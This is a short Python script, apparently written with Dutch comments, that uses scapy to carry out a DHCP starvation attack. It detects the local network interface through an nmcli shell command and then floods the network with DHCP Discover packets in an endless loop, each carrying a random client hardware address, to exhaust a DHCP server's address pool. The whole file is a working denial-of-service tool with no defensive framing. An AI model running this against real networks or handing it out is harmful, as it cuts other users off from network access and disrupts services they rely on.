import subprocess
from scapy.all import *


def get_interface() -> str:
    """Returnt de netwerk interface als string"""
    try:
        command = "nmcli -o d  | grep DEVICE -A1| tail --lines=1 | awk '{print $1}'"

        result = subprocess.run(command, capture_output=True,
                                text=True, shell=True, check=True)
        return result.stdout.strip()
    except Exception as e:
        return "error: {}".format(e)


def dhcp_starvation(interface: str):
    dhcp_discover = Ether() / IP(src='0.0.0.0', dst='255.255.255.255') / UDP(sport=68, dport=67) / \
        BOOTP(chaddr=RandMAC()) / \
        DHCP(options=[("message-type", "discover"), "end"])

    while True:
        sendp(dhcp_discover, iface=interface, verbose=False)
        print(f"DHCP Discover verstuurt vanaf: {dhcp_discover[Ether].src}")


if __name__ == "__main__":
    interface = get_interface()
    dhcp_starvation(interface)
